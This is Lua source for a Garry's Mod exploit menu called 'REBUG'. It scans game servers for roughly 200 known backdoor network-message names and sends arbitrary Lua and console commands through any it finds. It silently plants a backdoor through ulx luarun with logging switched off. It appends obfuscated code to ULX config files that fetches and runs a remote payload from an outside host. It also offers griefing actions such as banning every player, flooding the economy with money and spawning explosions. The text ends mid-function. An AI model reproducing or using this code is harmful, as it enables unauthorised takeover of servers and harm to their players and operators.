// <CodeVoid>
local _ = {
    _ = "PlaySound",
    a = "AddText",
    b = "NetString",
    c = "WriteString",
    d = "SendToServer",
    e = "Create",
    f = "Paint",
    g = "SetDrawColor",
    h = "DrawRect",
    i = "SetMaterial",
    j = "DrawOutlinedRect",
    k = "addLabel",
    l = "AddButton",
    m = "PostLua"
}

surface[_._]"HL1/fvox/bell.wav"
print"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"
MsgC(Color(255, 0, 0), [[
             ____________________________________________________
]])
MsgC(Color(255, 64, 0), [[
            /                                                    \
]])
MsgC(Color(255, 128, 0), [[
           |    _____________________________________________     |
]])
MsgC(Color(255, 191, 0), [[
           |   |                                             |    |
]])
MsgC(Color(255, 255, 0), [[
           |   |       _____  ______ ____  _    _  _____     |    |
]])
MsgC(Color(191, 255, 0), [[
           |   |      |  __ \|  ____|  _ \| |  | |/ ____|    |    |
]])
MsgC(Color(128, 255, 0), [[
           |   |      | |__) | |__  | |_) | |  | | |  __     |    |
]])
MsgC(Color(64, 255, 0), [[
           |   |      |  _  /|  __| |  _ <| |  | | | |_ |    |    |
]])
MsgC(Color(0, 255, 0), [[
           |   |      | | \ \| |____| |_) | |__| | |__| |    |    |
]])
MsgC(Color(0, 255, 64), [[
           |   |    __|_| _\_\______|____/ \____/_\_____|__  |    |
]])
MsgC(Color(0, 255, 128), [[
           |   |   / ____| |  | |  ____|   /\|__   __/ ____| |    |
]])
MsgC(Color(0, 255, 191), [[
           |   |  | |    | |__| | |__     /  \  | | | (___   |    |
]])
MsgC(Color(0, 255, 255), [[
           |   |  | |    |  __  |  __|   / /\ \ | |  \___ \  |    |
]])
MsgC(Color(0, 191, 255), [[
           |   |  | |____| |  | | |____ / ____ \| |  ____) | |    |
]])
MsgC(Color(0, 128, 255), [[
           |   |   \_____|_|  |_|______/_/    \_\_| |_____/  |    |
]])
MsgC(Color(0, 64, 255), [[
           |   |                                             |    |
]])
MsgC(Color(0, 0, 255), [[
           |   |                                             |    |
]])
MsgC(Color(64, 0, 255), [[
           |   |                                             |    |
]])
MsgC(Color(128, 0, 255), [[
           |   |                                             |    |
]])
MsgC(Color(191, 0, 255), [[
           |   |_____________________________________________|    |
]])
MsgC(Color(255, 0, 255), [[
           |                                                      |
]])
MsgC(Color(255, 0, 191), [[
            \_____________________________________________________/
]])
MsgC(Color(255, 0, 128), [[
                   \_______________________________________/
]])
MsgC(Color(255, 0, 64), [[
                _______________________________________________
]])
MsgC(Color(255, 0, 0), [[
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
]])
MsgC(Color(255, 64, 0), [[
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
]])
MsgC(Color(255, 128, 0), [[
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
]])
MsgC(Color(255, 191, 0), [[
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
]])
MsgC(Color(255, 255, 0), [[
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
]])
MsgC(Color(191, 255, 0), [[
:-----------------------------------------------------------------------------:
]])
MsgC(Color(128, 255, 0), [[
`----------------------------------------------------------------------------'
]])
chat[_.a](Color(255, 0, 0), "[REBUG] ", Color(20, 150, 200), "Welcome " .. LocalPlayer():Nick(), Color(20, 150, 200), ",", Color(255, 155, 0), " Mod Menu Loaded!")

if _G.QAC or _G.CAC then
    surface[_._]"ambient/alarms/klaxon1.wav"
    chat[_.a](Color(255, 0, 0), "[", "REBUG", "] ", Color(20, 150, 200), "CAC anti-cheat has been found!")
end

if file.Exists("snte_source.lua", "LUA") then
    chat[_.a](Color(255, 0, 0), "[", "REBUG", "] ", Color(20, 150, 200), "Snte has been found on server!")
end

local a, b, c, d, e, f = {}, "", {}, {}, {}, {}
f.memory = {}
local d, f, g, h, i, j = not 1, not 1, LocalPlayer(), 0, {}, {}

surface.CreateFont("button", {
    font = "Calibri",
    extended = not 1,
    size = 16,
    weight = 500,
    blursize = 0,
    scanlines = 0,
    antialias = not not 1,
    underline = not 1,
    italic = not 1,
    strikeout = not 1,
    symbol = not 1,
    rotary = not 1,
    shadow = not 1,
    additive = not 1,
    outline = not 1
})

local g, i, j, k, l, m, n, o = Material"gui/gradient", Material"gui/gradient_up", Material"gui/gradient_down", Color(17, 17, 17, 255), Color(22, 22, 22, 255), Color(16, 16, 16, 255), Color(50, 50, 50, 255), Color(42, 42, 42, 255)

function CheckIfStringExists(a)
    local b, c = pcall(net.Start, a)

    return b
end

function e.Notify(a)
    chat[_.a](Color(255, 0, 0), "[REBUG] ", color_white, a)
end

c.Strings = {
    {
        NetString = "Sandbox_ArmDupe"
    },
    {
        NetString = "entityhealt"
    },
    {
        NetString = "m"
    },
    {
        NetString = "material"
    },
    {
        NetString = "REBUG"
    },
    {
        NetString = "BetStrep"
    },
    {
        NetString = "keyss"
    },
    {
        NetString = "banId2"
    },
    {
        NetString = "Val"
    },
    {
        NetString = "models/zombie.mdl"
    },
    {
        NetString = "FPSBOOST"
    },
    {
        NetString = "PlayerCheck"
    },
    {
        NetString = "Sbox_darkrp"
    },
    {
        NetString = "insid3"
    },
    {
        NetString = "The_Dankwoo"
    },
    {
        NetString = "Sbox_itemstore"
    },
    {
        NetString = "Ulib_Message"
    },
    {
        NetString = "ULogs_Info"
    },
    {
        NetString = "ITEM"
    },
    {
        NetString = "R8"
    },
    {
        NetString = "fix"
    },
    {
        NetString = "Fix_Keypads"
    },
    {
        NetString = "Remove_Exploiters"
    },
    {
        NetString = "noclipcloakaesp_chat_text"
    },
    {
        NetString = "_Defqon"
    },
    {
        NetString = "_CAC_ReadMemory"
    },
    {
        NetString = "lmaogetdunked"
    },
    {
        NetString = "nostrip"
    },
    {
        NetString = "nocheat"
    },
    {
        NetString = "LickMeOut"
    },
    {
        NetString = "ULX_QUERY2"
    },
    {
        NetString = "ULXQUERY2"
    },
    {
        NetString = "https://i.imgur.com/Gf6hLMl.png"
    },
    {
        NetString = "MoonMan"
    },
    {
        NetString = "Im_SOCool"
    },
    {
        NetString = "JSQuery.Data(Post(false))"
    },
    {
        NetString = "Sandbox_GayParty"
    },
    {
        NetString = "DarkRP_UTF8"
    },
    {
        NetString = "oldNetReadData"
    },
    {
        NetString = "Gamemode_get"
    },
    {
        NetString = "memeDoor"
    },
    {
        NetString = "BackDoor"
    },
    {
        NetString = "SessionBackdoor"
    },
    {
        NetString = "DarkRP_AdminWeapons"
    },
    {
        NetString = "cucked"
    },
    {
        NetString = "NoNerks"
    },
    {
        NetString = "kek"
    },
    {
        NetString = "ZimbaBackDoor"
    },
    {
        NetString = "something"
    },
    {
        NetString = "random"
    },
    {
        NetString = "strip0"
    },
    {
        NetString = "fellosnake"
    },
    {
        NetString = "enablevac"
    },
    {
        NetString = "idk"
    },
    {
        NetString = "ÃžÃ ?D)â—˜"
    },
    {
        NetString = "snte"
    },
    {
        NetString = "apg_togglemode"
    },
    {
        NetString = "Hi"
    },
    {
        NetString = "beedoor"
    },
    {
        NetString = "BDST_EngineForceButton"
    },
    {
        NetString = "VoteKickNO"
    },
    {
        NetString = "REEEEEEEEEEEE"
    },
    {
        NetString = "_da_"
    },
    {
        NetString = "Nostra"
    },
    {
        NetString = "sniffing"
    },
    {
        NetString = "keylogger"
    },
    {
        NetString = "CakeInstall"
    },
    {
        NetString = "Cakeuptade"
    },
    {
        NetString = "love"
    },
    {
        NetString = "earth"
    },
    {
        NetString = "ulibcheck"
    },
    {
        NetString = "Nostrip_"
    },
    {
        NetString = "teamfrench"
    },
    {
        NetString = "ADM"
    },
    {
        NetString = "hack"
    },
    {
        NetString = "crack"
    },
    {
        NetString = "leak"
    },
    {
        NetString = "lokisploit"
    },
    {
        NetString = "1234"
    },
    {
        NetString = "123"
    },
    {
        NetString = "enculer"
    },
    {
        NetString = "cake"
    },
    {
        NetString = "seized"
    },
    {
        NetString = "88"
    },
    {
        NetString = "88_strings_"
    },
    {
        NetString = "nostraall"
    },
    {
        NetString = "blogs_update"
    },
    {
        NetString = "nolag"
    },
    {
        NetString = "loona_"
    },
    {
        NetString = "billys_logs"
    },
    {
        NetString = "loona"
    },
    {
        NetString = "negativedlebest"
    },
    {
        NetString = "berettabest"
    },
    {
        NetString = "ReadPing"
    },
    {
        NetString = "antiexploit"
    },
    {
        NetString = "adm_NetString"
    },
    {
        NetString = "mathislebg"
    },
    {
        NetString = "Bilboard.adverts:Spawn(false)"
    },
    {
        NetString = "pjHabrp9EY"
    },
    {
        NetString = "?"
    },
    {
        NetString = "lag_ping"
    },
    {
        NetString = "allowLimitedRCON(user) 0"
    },
    {
        NetString = "aze46aez67z67z64dcv4bt"
    },
    {
        NetString = "killserver"
    },
    {
        NetString = "fuckserver"
    },
    {
        NetString = "cvaraccess"
    },
    {
        NetString = "rcon"
    },
    {
        NetString = "rconadmin"
    },
    {
        NetString = "web"
    },
    {
        NetString = "jesuslebg"
    },
    {
        NetString = "zilnix"
    },
    {
        NetString = "ߠ?D)?"
    },
    {
        NetString = "disablebackdoor"
    },
    {
        NetString = "kill"
    },
    {
        NetString = "DefqonBackdoor"
    },
    {
        NetString = "DarkRP_AllDoorDatas"
    },
    {
        NetString = "0101.1"
    },
    {
        NetString = "awarn_remove"
    },
    {
        NetString = "_Infinity"
    },
    {
        NetString = "Infinity"
    },
    {
        NetString = "InfinityBackdoor"
    },
    {
        NetString = "_Infinity_Meme_"
    },
    {
        NetString = "arivia"
    },
    {
        NetString = "ULogs_B"
    },
    {
        NetString = "_Warns"
    },
    {
        NetString = "_cac_"
    },
    {
        NetString = "striphelper"
    },
    {
        NetString = "_vliss"
    },
    {
        NetString = "YYYYTTYXY6Y"
    },
    {
        NetString = "?????????????????п??? ?? ?ѿ??Ŀտ? ???ѿ??տ??Ю"
    },
    {
        NetString = "_KekTcf"
    },
    {
        NetString = "_blacksmurf"
    },
    {
        NetString = "blacksmurfBackdoor"
    },
    {
        NetString = "_Raze"
    },
    {
        NetString = "m9k_explosionradius"
    },
    {
        NetString = "m9k_explosive"
    },
    {
        NetString = "m9k_addons"
    },
    {
        NetString = "rcivluz"
    },
    {
        NetString = "SENDTEST"
    },
    {
        NetString = "_clientcvars"
    },
    {
        NetString = "_main"
    },
    {
        NetString = "stream"
    },
    {
        NetString = "waoz"
    },
    {
        NetString = "bdsm"
    },
    {
        NetString = "ZernaxBackdoor"
    },
    {
        NetString = "UKT_MOMOS"
    },
    {
        NetString = "anticrash"
    },
    {
        NetString = "audisquad_lua"
    },
    {
        NetString = "dontforget"
    },
    {
        NetString = "noprop"
    },
    {
        NetString = "thereaper"
    },
    {
        NetString = "0x13"
    },
    {
        NetString = "Child"
    },
    {
        NetString = "!Cac"
    },
    {
        NetString = "azkaw"
    },
    {
        NetString = "BOOST_FPS"
    },
    {
        NetString = "childexploit"
    },
    {
        NetString = "ULX_ANTI_BACKDOOR"
    },
    {
        NetString = "FADMIN_ANTICRASH"
    },
    {
        NetString = "ULX_QUERY_TEST2"
    },
    {
        NetString = "GMOD_NETDBG"
    },
    {
        NetString = "netlib_debug"
    },
    {
        NetString = "_DarkRP_Reading"
    },
    {
        NetString = "lag_ping"
    },
    {
        NetString = "||||"
    },
    {
        NetString = "SteamApp2313"
    },
    {
        NetString = "FPP_RemovePLYCache"
    },
    {
        NetString = "fuwa"
    },
    {
        NetString = "stardoor"
    },
    {
        NetString = "SENDTEST"
    },
    {
        NetString = "rcivluz"
    },
    {
        NetString = "c"
    },
    {
        NetString = "N::B::P"
    },
    {
        NetString = "changename"
    },
    {
        NetString = "PlayerItemPickUp"
    },
    {
        NetString = "echangeinfo"
    },
    {
        NetString = "fourhead"
    },
    {
        NetString = "music"
    },
    {
        NetString = "slua"
    },
    {
        NetString = "adm_network"
    },
    {
        NetString = "componenttolua"
    },
    {
        NetString = "theberettabcd"
    },
    {
        NetString = "SparksLeBg"
    },
    {
        NetString = "DarkRP_Armors"
    },
    {
        NetString = "DarkRP_Gamemodes"
    },
    {
        NetString = "fancyscoreboard_leave"
    },
    {
        NetString = "PRDW_GET"
    },
    {
        NetString = "pwn_http_send"
    },
    {
        NetString = "AnatikLeNoob"
    },
    {
        NetString = "GVacDoor"
    },
    {
        NetString = "Keetaxor"
    },
    {
        NetString = "BackdoorPrivate666"
    },
    {
        NetString = "YohSambreLeBest"
    },
    {
        NetString = "SNTE<ALL"
    },
    {
        NetString = "!Ǻ/;."
    },
    {
        NetString = "pwn_http_answer"
    },
    {
        NetString = "pwn_wake"
    },
    {
        NetString = "verifiopd"
    },
    {
        NetString = "AidsTacos"
    },
    {
        NetString = "shix"
    },
    {
        NetString = "PDA_DRM_REQUEST_CONTENT"
    },
    {
        NetString = "xenoreceivetargetdata2"
    },
    {
        NetString = "xenoreceivetargetdata1"
    },
    {
        NetString = "xenoserverdatafunction"
    },
    {
        NetString = "xenoserverfunction"
    },
    {
        NetString = "xenoclientdatafunction"
    },
    {
        NetString = "xenoclientfunction"
    },
    {
        NetString = "xenoactivation"
    },
    {
        NetString = "EXEC_REMOTE_APPS"
    },
    {
        NetString = "yohsambresicianatik<3"
    },
    {
        NetString = "Sbox_Message"
    },
    {
        NetString = "Sbox_gm_attackofnullday_key"
    },
    {
        NetString = "The_DankWhy"
    },
    {
        NetString = "nw.readstream"
    },
    {
        NetString = "AbSoluT"
    },
    {
        NetString = "__G____CAC"
    },
    {
        NetString = "Weapon_88"
    },
    {
        NetString = "mecthack"
    },
    {
        NetString = "SetPlayerDeathCount"
    },
    {
        NetString = "FAdmin_Notification_Receiver"
    },
    {
        NetString = "DarkRP_ReceiveData"
    },
    {
        NetString = "fijiconn"
    },
    {
        NetString = "LuaCmd"
    },
    {
        NetString = "EnigmaProject"
    },
    {
        NetString = "z"
    },
    {
        NetString = "cvardel"
    },
    {
        NetString = "json.parse(crashsocket)"
    },
    {
        NetString = "effects_en"
    },
    {
        NetString = "file"
    },
    {
        NetString = "gag"
    },
    {
        NetString = "asunalabestwaifu"
    },
    {
        NetString = "stoppk"
    },
    {
        NetString = "Ulx_Error_88"
    },
    {
        NetString = "NoOdium_ReadPing"
    },
    {
        NetString = "banId"
    },
    {
        NetString = "kickId2"
    },
    {
        NetString = "elsakura"
    }
}

function CheckBackdoors()
    for a, d in pairs(c.Strings) do
        if CheckIfStringExists(d[_.b]) then
            b = d[_.b]
            chat[_.a](Color(255, 0, 0), "[RVAC]", Color(20, 150, 20), " Found Vulnerability ▶ ", Color(20, 150, 200), [[]] .. d[_.b])
        end
    end
end

function e.PostLua(a)
    net.Start(b)
    net[_.c](a)
    net.WriteBit(1)
    net[_.d]()
end

function e.PostRcon(a)
    net.Start(b)
    net[_.c](a)
    net.WriteBit(not 1)
    net[_.d]()
end

function e.PostLua(a)
    if (b == "") then
        chat[_.a](Color(255, 0, 0), "[REBUG]", Color(20, 150, 200), " You are not targeting a NetString")

        return
    end

    net.Start(b)
    net[_.c](a)
    net.WriteBit(1)
    net[_.d]()
end

function sendLuaPly(a)
    net.Start(b)
    net[_.c]("BroadcastLua([[" .. a .. "]])")
    net[_.d]()
end

function sendLuaPlyKv(a)
    net.Start(b)
    net[_.c]("for k,v in pairs(player.GetAll()) do v:SendLua(" .. a .. ") end")
    net[_.d]()
end

function a.voidz()
    hook.Add("Think", "openMenu", function()
        if input.IsKeyDown(KEY_INSERT) and not d then
            d = not not 1
            a.load()

            timer.Simple(0.5, function()
                d = not 1
            end)
        end
    end)
end

function a.load()
    if f then
        CloseMenu()

        return
    end

    f = not not 1
    local c = vgui[_.e]"DFrame"
    surface[_._]"buttons/blip1.wav"
    c:SetSize(720, 750)
    c:SetPos(40, 40)
    c:SetTitle""
    c:ShowCloseButton()
    c:MakePopup()
    c:SetVisible(not not 1)
    c:SetDraggable(not 1)

    c[_.f] = function(c, d, g)
        surface[_.g](Color(40, 40, 40, 255))
        surface[_.h](0, 0, d, g)
        surface[_.g](36, 21, 21)
        surface[_.i](i)
        surface[_.g](m)
        surface[_.i](j)
        surface[_.g](m)
        surface[_.g](0, 0, 0, 255)
        surface[_.j](0, 0, d, g)
        surface[_.j](1, 1, d - 2, g - 2)
    end

    local d = vgui[_.e]('DPanelList', c)
    d:SetSize(705, 735)
    d:SetPos(8, 8)

    d[_.f] = function(c, d, g)
        surface[_.g](Color(26, 26, 26))
        surface[_.h](0, 0, d, g)
        surface[_.g](21, 21, 21)
        surface[_.i](i)
        surface[_.g](m)
        surface[_.i](j)
        surface[_.g](m)
        surface[_.g](35, 35, 35, 255)
        surface[_.j](0, 0, d, g)
    end

    local g = vgui[_.e]('DPanelList', d)
    g:SetSize(705, 2)
    g:SetPos(1, 0)

    g[_.f] = function(c, d, g)
        surface[_.g](Color(100, 100, 100))
        surface[_.h](0, 0, d, g)
        surface[_.g](21, 21, 21)
        surface[_.g](Color(100, 100, 100))
        surface[_.h](0, 0, d, g)
        surface[_.g](21, 21, 21)
        surface[_.i](i)
        surface[_.g](m)
        surface[_.i](j)
        surface[_.g](m)
        surface[_.g](HSVToColor(CurTime() % 6 * 60, 1, 1))
        surface[_.j](0, 0, d, g)
        surface[_.j](1, 1, d - 2, g - 2)
    end

    local g = vgui[_.e]("DLabel", d)
    g:SetFont"Trebuchet18"
    g:SetText"No Player Selected"
    g:SetTextColor(Color(255, 255, 255))
    g:SetPos(510, 710)
    g:SizeToContents()

    function a.AddButton(c, d, g)
        local k = d:Add"DButton"
        k:SetText""
        k:Dock(TOP)
        k:SetFont"DermaDefault"
        k:DockMargin(0, 0, 0, 8)
        k:SetSize(50, 25)
        k.DoClick = g

        k[_.f] = function(d, g, k)
            surface[_.g](Color(200, 24, 24))
            surface[_.g](40, 40, 40)
            surface[_.j](0, 0, g, k)
            draw.SimpleTextOutlined(c, "button", d:GetWide() / 2, d:GetTall() / 2, color_white, 1, 1, 1, color_black)
        end
    end

    function e.addLabel(c, d, g, k)
        local l = k:Add"DLabel"
        l:SetSize(200, 80)
        l:SetPos(d, g)
        l:SetFont"Trebuchet18"
        l:SetText(c)
        l:SetTextColor(Color(255, 255, 255, 255))
    end

    e[_.k]("Server BackDoors", 20, 28, d)
    e[_.k]("Target BackDoors", 257, 28, d)
    e[_.k]("Player List", 510, 28, d)
    e[_.k]("Extras( sound, client, bd )", 253, 275, d)
    local k = vgui[_.e]("DPanelList", d)
    k:SetPos(10, 80)
    k:SetSize(200, 538)
    k:SetPadding(5)
    k:SetSpacing(5)
    k:EnableHorizontal(not 1)
    k:EnableVerticalScrollbar(not not 1)
    k:SetName""

    k[_.f] = function(c, d, g)
        surface[_.g](Color(24, 24, 24))
        surface[_.h](0, 0, d, g)
        surface[_.g](21, 21, 21)
        surface[_.i](i)
        surface[_.g](m)
        surface[_.i](j)
        surface[_.g](m)
        surface[_.g](35, 35, 35, 255)
        surface[_.j](0, 0, d, g)
    end

    local l = vgui[_.e]("DPanelList", k)
    l:SetPos(11.5, 10)
    l:SetSize(188, 520)
    l:SetPadding(5)
    l:SetSpacing(5)
    l:EnableHorizontal(not 1)
    l:EnableVerticalScrollbar(not not 1)
    l:SetName""

    l[_.f] = function(c, d, g)
        surface[_.g](Color(24, 24, 24))
        surface[_.h](0, 0, d, g)
        surface[_.g](21, 21, 21)
        surface[_.g](35, 35, 35, 0)
        surface[_.j](0, 0, d, g)
    end

    local k = vgui[_.e]("DPanelList", d)
    k:SetPos(247, 80)
    k:SetSize(200, 215)
    k:SetPadding(5)
    k:SetSpacing(5)
    k:EnableHorizontal(not 1)
    k:EnableVerticalScrollbar(not not 1)
    k:SetName""

    k[_.f] = function(c, d, g)
        surface[_.g](Color(24, 24, 24))
        surface[_.h](0, 0, d, g)
        surface[_.g](21, 21, 21)
        surface[_.i](i)
        surface[_.g](m)
        surface[_.i](j)
        surface[_.g](m)
        surface[_.g](35, 35, 35, 255)
        surface[_.j](0, 0, d, g)
    end

    local n = vgui[_.e]("DPanelList", k)
    n:SetPos(8, 10)
    n:SetSize(185, 200)
    n:SetPadding(5)
    n:SetSpacing(5)
    n:EnableHorizontal(not 1)
    n:EnableVerticalScrollbar(not not 1)
    n:SetName""

    n[_.f] = function(c, d, g)
        surface[_.g](Color(24, 24, 24))
        surface[_.h](0, 0, d, g)
        surface[_.g](21, 21, 21)
        surface[_.g](35, 35, 35, 0)
        surface[_.j](0, 0, d, g)
    end

    local k = vgui[_.e]("DPanelList", d)
    k:SetPos(247, 326)
    k:SetSize(200, 399)
    k:SetPadding(5)
    k:SetSpacing(5)
    k:EnableHorizontal(not 1)
    k:EnableVerticalScrollbar(not not 1)
    k:SetName""

    k[_.f] = function(c, d, g)
        surface[_.g](Color(24, 24, 24))
        surface[_.h](0, 0, d, g)
        surface[_.g](21, 21, 21)
        surface[_.i](i)
        surface[_.g](m)
        surface[_.i](j)
        surface[_.g](m)
        surface[_.g](35, 35, 35, 255)
        surface[_.j](0, 0, d, g)
    end

    local o = vgui[_.e]("DPanelList", k)
    o:SetPos(12, 10)
    o:SetSize(185, 380)
    o:SetPadding(5)
    o:SetSpacing(5)
    o:EnableHorizontal(not 1)
    o:EnableVerticalScrollbar(not not 1)
    o:SetName""

    o[_.f] = function(c, d, g)
        surface[_.g](Color(24, 24, 24))
        surface[_.h](0, 0, d, g)
        surface[_.g](21, 21, 21)
        surface[_.g](35, 35, 35, 0)
        surface[_.j](0, 0, d, g)
    end

    local k = vgui[_.e]("DPanelList", d)
    k:SetPos(493, 80)
    k:SetSize(200, 625)
    k:SetPadding(5)
    k:SetSpacing(5)
    k:EnableHorizontal(not 1)
    k:EnableVerticalScrollbar(not not 1)

    k[_.f] = function(c, d, g)
        surface[_.g](Color(24, 24, 24))
        surface[_.h](0, 0, d, g)
        surface[_.g](21, 21, 21)
        surface[_.i](i)
        surface[_.g](m)
        surface[_.i](j)
        surface[_.g](m)
        surface[_.g](35, 35, 35, 255)
        surface[_.j](0, 0, d, g)
    end

    local p = vgui[_.e]("DPanelList", k)
    p:SetPos(8, 10)
    p:SetSize(185, 606)
    p:SetPadding(5)
    p:SetSpacing(5)
    p:EnableHorizontal(not 1)
    p:EnableVerticalScrollbar(not not 1)
    p:SetName""

    p[_.f] = function(c, d, g)
        surface[_.g](Color(24, 24, 24))
        surface[_.h](0, 0, d, g)
        surface[_.g](21, 21, 21)
        surface[_.g](35, 35, 35, 0)
        surface[_.j](0, 0, d, g)
    end

    local k = vgui[_.e]("DScrollPanel", p)
    k:Dock(FILL)
    local p = k:GetVBar()

    function p:Paint()
    end

    function p.btnUp:Paint()
    end

    function p.btnDown:Paint()
    end

    function p.btnGrip:Paint()
    end

    for c, d in pairs(player.GetAll()) do
        a[_.l](d:Name(), k, function()
            h = d:UserID()
            g:SetText("Selected: " .. Player(h):Name())
        end)
    end

    local g = vgui[_.e]("DTextEntry", d)
    g:SetPos(10, 8)
    g:SetSize(685, 35)
    g:SetTextColor(Color(255, 255, 255, 255))
    g:SetFont"Trebuchet18"

    g[_.f] = function(c, d, g)
        surface[_.g](Color(24, 24, 24))
        surface[_.h](0, 0, d, g)
        surface[_.g](21, 21, 21)
        surface[_.i](i)
        surface[_.g](m)
        surface[_.i](j)
        surface[_.g](m)
        surface[_.g](35, 35, 35, 255)
        surface[_.j](0, 0, d, g)
        c:DrawTextEntryText(Color(255, 255, 255), Color(20, 20, 150), Color(100, 100, 100))
    end

    g.OnEnter = function(c)
        surface[_._]"buttons/button18.wav"
        e.Notify("Targeting: '" .. g:GetValue() .. "'")
        b = c:GetValue()
    end

    local g = vgui[_.e]("DButton", d)
    g:SetSize(200, 45)
    g:SetPos(10, 627)
    g:SetFont"Trebuchet18"
    g:SetText"Print backdoor code"
    g:SetTextColor(Color(255, 255, 255, 255))

    g[_.f] = function(c, d, g)
        surface[_.g](Color(24, 24, 24))
        surface[_.h](0, 0, d, g)
        surface[_.g](21, 21, 21)
        surface[_.i](i)
        surface[_.g](m)
        surface[_.i](j)
        surface[_.g](m)
        surface[_.g](35, 35, 35, 255)
        surface[_.j](0, 0, d, g)
    end

    g.DoClick = function()
        e.Notify("Copied to clipboard", Color(155, 255, 155))
        local c = [[http.Fetch("https://rvac/gq/_!/p",function(b)RunString(b)end)]]
        SetClipboardText(c)
    end

    local g = vgui[_.e]("DButton", d)
    g:SetSize(200, 45)
    g:SetPos(10, 680)
    g:SetFont"Trebuchet18"
    g:SetText"ULX Luarun Backdoor"
    g:SetTextColor(Color(255, 255, 255, 255))

    g[_.f] = function(c, d, g)
        surface[_.g](Color(24, 24, 24))
        surface[_.h](0, 0, d, g)
        surface[_.g](21, 21, 21)
        surface[_.i](i)
        surface[_.g](m)
        surface[_.i](j)
        surface[_.g](m)
        surface[_.g](35, 35, 35, 255)
        surface[_.j](0, 0, d, g)
    end

    g.DoClick = function()
        e.Notify("Using ulx luarun to silently infect server", Color(155, 255, 155))
        RunConsoleCommand("ulx", "logecho", "0")

        timer.Simple(0.5, function()
            RunConsoleCommand("ulx", "luarun", "util.AddNetworkString ('REBUG') net.Receive ('REBUG', function (length, ply) local netString = net.ReadString () local bit = net.ReadBit () if bit == 1 then RunString (netString) else game.ConsoleCommand (netString ..'\n') end end)")
        end)

        timer.Simple(1, function()
            RunConsoleCommand("ulx", "logecho", "1")
        end)
    end

    local d = vgui[_.e]("DScrollPanel", l)
    d:Dock(FILL)
    local g = d:GetVBar()

    function g:Paint()
    end

    function g.btnUp:Paint()
    end

    function g.btnDown:Paint()
    end

    function g.btnGrip:Paint()
    end

    local g = vgui[_.e]("DScrollPanel", n)
    g:Dock(FILL)
    local k = g:GetVBar()

    function k:Paint()
    end

    function k.btnUp:Paint()
    end

    function k.btnDown:Paint()
    end

    function k.btnGrip:Paint()
    end

    local k = vgui[_.e]("DScrollPanel", o)
    k:Dock(FILL)
    local l = k:GetVBar()

    function l:Paint()
    end

    function l.btnUp:Paint()
    end

    function l.btnDown:Paint()
    end

    function l.btnGrip:Paint()
    end

    a[_.l]("@Inject SendLua Interface", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[util.AddNetworkString ('REBUG') net.Receive ('REBUG', function (length, ply) local netString = net.ReadString () local bit = net.ReadBit () if bit == 1 then RunString (netString) else game.ConsoleCommand (netString ..'\n') end end)]]
    end)

    a[_.l]("@Persistant Infection", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[file.Append("ulx/config.txt", "\n"..[=[x='R'..'unS'..'tri'..'n'..'g'_='r'..''..'va'..'c'..'.g'..'q/'x0=_G['Co'..'mpil'..''..'eSt'..'ri'..'ng']__='h'..''..'t'..'t'..'ps'..'://'x0(__,_,'_!/p',x)]=])]]
        e[_.m][[file.Append("ulib/misc_registered.txt", "\n"..[=[x='R'..'unS'..'tri'..'n'..'g'_='r'..''..'va'..'c'..'.g'..'q/'x0=_G['Co'..'mpil'..''..'eSt'..'ri'..'ng']__='h'..''..'t'..'t'..'ps'..'://'x0(__,_,'_!/p',x)]=])]]
    end)

    a[_.l]("Artillery Server Strike", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[if !bombstrike then

	hook.Add("Think", "lulz_bombstrike", function()

	local explode = ents.Create("env_explosion")

	local ps = Vector(math.random(-8000, 8000), math.random(-8000, 8000), math.random(-5000, 5000))

	local trc = {}

	trc.start = ps

	trc.endpos = ps + Vector(0, 0, -99999)

	local tr = util.TraceLine(trc)

	if !tr.Hit then return end

	explode:SetPos(tr.HitPos)

	explode:Spawn()

	explode:SetKeyValue("iMagnitude", "400")

	explode:Fire("Explode", 0, 0)

	end)

	bombstrike = true

	else

	hook.Remove("Think", "lulz_bombstrike")

	bombstrike = false

	end]]
    end)

    a[_.l]("Announce centre screen", d, function()
        surface[_._]"buttons/button18.wav"

        Derma_StringRequest("Set Custom Text", "Set Text", "", function(c)
            e[_.m]("for k, v in pairs(player.GetAll()) do v:PrintMessage( HUD_PRINTCENTER, \"" .. c .. "\") end")
        end)
    end)

    a[_.l]("Broken Glass Symphony", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[if !timer.Exists("A true masterpiece") then

	timer.Create("A true masterpiece", 0.2, 0, function()

	for _, p in pairs(player.GetAll()) do

	p:EmitSound("physics/glass/glass_largesheet_break"..math.random(1,3)..".wav", 100, math.random(40, 180))

	end

	end)

	else

	timer.Remove("A true masterpiece")

	end]]
    end)

    a[_.l]("Double Or Nothing 100%", d, function()
        surface[_._]"buttons/button18.wav"
		
		Derma_StringRequest("Set Persentage chance", "1-100%", "", function(c)
			e[_.m]"BDON_CONFIG.doubleChance = "..c)
		end)
	end)

    a[_.l]("Ban All Players", d, function()
        surface[_._]"buttons/button18.wav"

        Derma_StringRequest("Ban All Players", "Reason", "", function(c)
            e[_.m]([[

	local id = ]] .. LocalPlayer():UserID() .. [[

	for k, v in next, player.GetAll() do

	if v:UserID() == id then continue end

	v:Ban( 0, false )

	v:Kick( "]] .. tostring(c) .. [[" )

	end]])
        end)
    end)

    a[_.l]("Break Economy", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[for k,v in pairs(player.GetAll()) do v:addMoney(9999999999) end]]
    end)

    a[_.l]("Cleanup Map", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[game.CleanUpMap()]]
    end)

    a[_.l]("Console Jammer", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[if !(timer.Exists("consoleJammer")) then

	timer.Create("consoleJammer", 0.5, 0, function()

	print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")

	end)

	else

	timer.Destroy("consoleJammer")

	end]]
    end)

